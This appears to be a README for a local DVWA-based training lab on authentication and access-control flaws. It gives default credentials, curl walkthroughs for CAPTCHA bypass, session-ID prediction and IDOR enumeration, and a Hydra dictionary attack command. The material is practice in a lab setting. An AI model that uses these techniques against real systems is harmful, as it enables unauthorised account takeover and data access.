# Attacking Authentication & Broken Access Control Lab

## Overview

Practice brute-forcing logins, password reset logic flaws, session hijacking, cookie predictability, insecure CAPTCHA workflows, and Insecure Direct Object References (IDOR).

- **Default Port / Access**: `8084` (`http://localhost:8084`)
- **Directory**: `Classes/02_web_penetration_tester/07_08_09_10_auth_and_access_control/authentication_lab`
- **Container Name**: `cyberlab_02_auth_lab`
- **Upstream Source of Truth**:
  - Official DVWA Repository: [digininja/DVWA](https://github.com/digininja/DVWA)
  - Upstream Docker Container: `vulnerables/web-dvwa:latest`

---

## Credentials & Database Setup

### Default Credentials

| Service / Account | Username  | Password      | Notes                         |
| ----------------- | --------- | ------------- | ----------------------------- |
| DVWA Web Login    | `admin`   | `password`    | Primary administrator account |
| DVWA Test User    | `gordonb` | `abc123`      | Pre-seeded database user      |
| DVWA Test User    | `1337`    | `charley`     | Pre-seeded database user      |
| DVWA Test User    | `pablo`   | `letmein`     | Pre-seeded database user      |
| DVWA Test User    | `smithy`  | `password`    | Pre-seeded database user      |
| Internal MySQL    | `root`    | `vulnerables` | Embedded MariaDB service      |

### Initializing the Database

When starting the lab for the first time, initialize the database either via browser or CLI:

#### Method A: Web UI

1. Navigate to `http://localhost:8084/login.php` and sign in with `admin` / `password`.
2. DVWA will redirect you to `http://localhost:8084/setup.php`.
3. Click the **Create / Reset Database** button at the bottom of the page.
4. Once completed, log back in at `http://localhost:8084/login.php`.

#### Method B: Automated CLI (cURL)

Run the following script block to initialize the database headlessly:

```bash
COOKIE_JAR=$(mktemp)

# 1. Fetch login CSRF token and session cookie
LOGIN_TOKEN=$(curl -s -c "$COOKIE_JAR" http://localhost:8084/login.php | grep -oP "(?<=name='user_token' value=')[a-f0-9]+")

# 2. Authenticate as admin
curl -s -b "$COOKIE_JAR" -c "$COOKIE_JAR" \
  -d "username=admin&password=password&Login=Login&user_token=$LOGIN_TOKEN" \
  http://localhost:8084/login.php -o /dev/null

# 3. Fetch setup CSRF token
SETUP_TOKEN=$(curl -s -b "$COOKIE_JAR" -c "$COOKIE_JAR" http://localhost:8084/setup.php | grep -oP "(?<=name='user_token' value=')[a-f0-9]+")

# 4. Trigger database reset / initialization
curl -s -L -b "$COOKIE_JAR" -c "$COOKIE_JAR" \
  -d "create_db=Create+%2F+Reset+Database&user_token=$SETUP_TOKEN" \
  http://localhost:8084/setup.php | grep -E "message|Setup successful"

rm -f "$COOKIE_JAR"
```

---

## Authentication Attack Vectors & Walkthroughs

### 1. Brute Force (`/vulnerabilities/brute/`)

The brute force module tests authentication endpoints that lack rate limiting, account lockout, or anti-automation protections.

#### Vulnerability Analysis:

- **Low Security**: Takes GET parameters `username` and `password` without rate limits or CSRF tokens. A simple dictionary attack or wordlist scan succeeds immediately.
- **Medium Security**: Implements an arbitrary 2-second delay (`sleep(2)`) upon failure, which slows down but does not prevent automated attacks.
- **High Security**: Requires a per-request `user_token` CSRF parameter and random delay. Automated tools like Burp Intruder or custom Python scripts must parse and include tokens dynamically.

#### Exact cURL Verification:

```bash
# Save an authenticated session cookie
COOKIE_JAR=$(mktemp)
LOGIN_TOKEN=$(curl -s -c "$COOKIE_JAR" http://localhost:8084/login.php | grep -oP "(?<=name='user_token' value=')[a-f0-9]+")
curl -s -b "$COOKIE_JAR" -c "$COOKIE_JAR" -d "username=admin&password=password&Login=Login&user_token=$LOGIN_TOKEN" http://localhost:8084/login.php -o /dev/null

# Successful authentication attempt:
curl -s -b "$COOKIE_JAR" "http://localhost:8084/vulnerabilities/brute/?username=admin&password=password&Login=Login" | grep -o "Welcome to the password protected area admin"

# Failed authentication attempt:
curl -s -b "$COOKIE_JAR" "http://localhost:8084/vulnerabilities/brute/?username=admin&password=wrongpass&Login=Login" | grep -o "Username and/or password incorrect"

rm -f "$COOKIE_JAR"
```

#### Automated Dictionary Attack with Hydra:

```bash
# Extract PHPSESSID from your browser or curl session
PHPSESSID="your_phpsessid_here"

hydra -l admin -P /usr/share/wordlists/rockyou.txt localhost -s 8084 http-get-form \
  "/vulnerabilities/brute/:username=^USER^&password=^PASS^&Login=Login:F=Username and/or password incorrect:H=Cookie: PHPSESSID=${PHPSESSID}; security=low"
```

---

### 2. Weak Session IDs (`/vulnerabilities/weak_id/`)

This module demonstrates flawed session generation algorithms where session identifiers lack entropy and can be predicted or forged.

#### Vulnerability Analysis:

- **Low Security**: The session ID is an auto-incrementing integer (`$_SESSION['last_session_id']++`). An attacker can hijack subsequent user sessions simply by guessing `id+1`.
- **Medium Security**: The session ID is the current UNIX timestamp (`time()`). Attackers knowing the approximate time of a target login can brute-force a narrow range of timestamps.
- **High Security**: The session ID is an MD5 hash of an auto-incrementing integer (`md5($_SESSION['last_session_id_high'])`). The hash is easily reversed using rainbow tables or offline cracking.

#### Exact cURL Verification:

```bash
COOKIE_JAR=$(mktemp)
LOGIN_TOKEN=$(curl -s -c "$COOKIE_JAR" http://localhost:8084/login.php | grep -oP "(?<=name='user_token' value=')[a-f0-9]+")
curl -s -b "$COOKIE_JAR" -c "$COOKIE_JAR" -d "username=admin&password=password&Login=Login&user_token=$LOGIN_TOKEN" http://localhost:8084/login.php -o /dev/null

# Issue sequential POST requests to observe the predictable session cookie:
echo "Request 1:" && curl -s -i -b "$COOKIE_JAR" -c "$COOKIE_JAR" -X POST "http://localhost:8084/vulnerabilities/weak_id/" | grep -i "Set-Cookie: dvwaSession="
echo "Request 2:" && curl -s -i -b "$COOKIE_JAR" -c "$COOKIE_JAR" -X POST "http://localhost:8084/vulnerabilities/weak_id/" | grep -i "Set-Cookie: dvwaSession="
echo "Request 3:" && curl -s -i -b "$COOKIE_JAR" -c "$COOKIE_JAR" -X POST "http://localhost:8084/vulnerabilities/weak_id/" | grep -i "Set-Cookie: dvwaSession="

rm -f "$COOKIE_JAR"
```

Output confirms sequential integers:

```http
Set-Cookie: dvwaSession=1
Set-Cookie: dvwaSession=2
Set-Cookie: dvwaSession=3
```

---

### 3. Insecure CAPTCHA Bypass (`/vulnerabilities/captcha/`)

The Insecure CAPTCHA module illustrates multi-stage workflow vulnerabilities and client-side access control flaws where CAPTCHA verification can be circumvented.

#### Vulnerability Analysis:

- **Low Security**: The password change process is split into two steps using a hidden parameter (`step=1` validates the CAPTCHA; `step=2` updates the password). An attacker can bypass the CAPTCHA entirely by sending a direct POST request specifying `step=2`.
- **Medium Security**: The backend inspects `$_POST['passed_captcha']`. An attacker simply sends `passed_captcha=true` alongside `step=2` to change the password without ever solving a CAPTCHA.

#### Exact cURL Verification:

```bash
COOKIE_JAR=$(mktemp)
LOGIN_TOKEN=$(curl -s -c "$COOKIE_JAR" http://localhost:8084/login.php | grep -oP "(?<=name='user_token' value=')[a-f0-9]+")
curl -s -b "$COOKIE_JAR" -c "$COOKIE_JAR" -d "username=admin&password=password&Login=Login&user_token=$LOGIN_TOKEN" http://localhost:8084/login.php -o /dev/null

# Bypass CAPTCHA in Low Security by submitting step=2 directly:
curl -s -b "$COOKIE_JAR" \
  -d "step=2&password_new=newsecret123&password_conf=newsecret123&Change=Change" \
  "http://localhost:8084/vulnerabilities/captcha/" | grep -o "Password Changed."

# Reset password back to default 'password':
curl -s -b "$COOKIE_JAR" \
  -d "step=2&password_new=password&password_conf=password&Change=Change" \
  "http://localhost:8084/vulnerabilities/captcha/" | grep -o "Password Changed."

rm -f "$COOKIE_JAR"
```

---

### 4. Insecure Direct Object Reference (IDOR) & User Enumeration

Demonstrates authorization failures where users can access arbitrary account objects, records, and media belonging to other users without authorization checks.

#### Attack Vectors:

1. **User Identifier Enumeration (`/vulnerabilities/sqli/`)**:
   Querying user identifiers directly returns full name and profile attributes for all users in the database:

   ```bash
   COOKIE_JAR=$(mktemp)
   LOGIN_TOKEN=$(curl -s -c "$COOKIE_JAR" http://localhost:8084/login.php | grep -oP "(?<=name='user_token' value=')[a-f0-9]+")
   curl -s -b "$COOKIE_JAR" -c "$COOKIE_JAR" -d "username=admin&password=password&Login=Login&user_token=$LOGIN_TOKEN" http://localhost:8084/login.php -o /dev/null

   # Query user object 2 (Gordon Brown)
   curl -s -b "$COOKIE_JAR" "http://localhost:8084/vulnerabilities/sqli/?id=2&Submit=Submit" | grep -A 2 "<pre>ID:"

   # Query user object 3 (Hack Me)
   curl -s -b "$COOKIE_JAR" "http://localhost:8084/vulnerabilities/sqli/?id=3&Submit=Submit" | grep -A 2 "<pre>ID:"

   rm -f "$COOKIE_JAR"
   ```

2. **Direct Static Object / Avatar Exposure (`/hackable/users/`)**:
   User avatars and private uploads are stored using predictable naming schemas without access control restrictions:
   ```bash
   curl -s -I "http://localhost:8084/hackable/users/admin.jpg" | head -n 1
   curl -s -I "http://localhost:8084/hackable/users/gordonb.jpg" | head -n 1
   curl -s -I "http://localhost:8084/hackable/users/1337.jpg" | head -n 1
   ```

---

## YouTube Walkthroughs & Solving Guides

- [Authentication Vulnerabilities | Complete Guide (Rana Khalil)](https://www.youtube.com/watch?v=mox6DL4zK7I)
- [Broken Access Control | Complete Guide (Rana Khalil)](https://www.youtube.com/watch?v=_jz5qFWhLcg)
- [NahamSec - Insecure Direct Object Reference / IDOR Explained](https://www.youtube.com/watch?v=bCUqio4gNu4)

---

## Quick CLI Control

From the `cyber_lab` root directory:

```bash
# Check status
./lab status

# Rebuild / start the lab
docker compose -f Classes/02_web_penetration_tester/07_08_09_10_auth_and_access_control/authentication_lab/docker-compose.yml up -d

# Stop this lab
docker compose -f Classes/02_web_penetration_tester/07_08_09_10_auth_and_access_control/authentication_lab/docker-compose.yml down
```
